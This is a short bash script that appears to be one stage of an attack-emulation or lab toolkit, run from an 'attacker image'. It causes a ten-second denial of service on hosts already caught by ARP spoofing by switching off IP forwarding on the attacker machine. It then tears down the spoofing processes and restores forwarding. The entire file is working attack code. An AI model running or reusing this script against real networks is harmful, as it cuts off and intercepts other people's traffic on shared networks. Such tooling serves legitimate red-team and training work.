#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

PIDFILE="$DATA_PATH/KC2/arp_pids"
TIME_DOS=10

# Installing dependencies
require_tools sysctl

echo "DOS enabled for $TIME_DOS seconds"
sysctl -w net.ipv4.ip_forward=0 >/dev/null
sleep $TIME_DOS

echo "Removing arp spoofing..."
${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/remove-pids.sh "$PIDFILE" || echo "[WARN] remove-pids failed" >&2
sysctl -w net.ipv4.ip_forward=1 >/dev/null
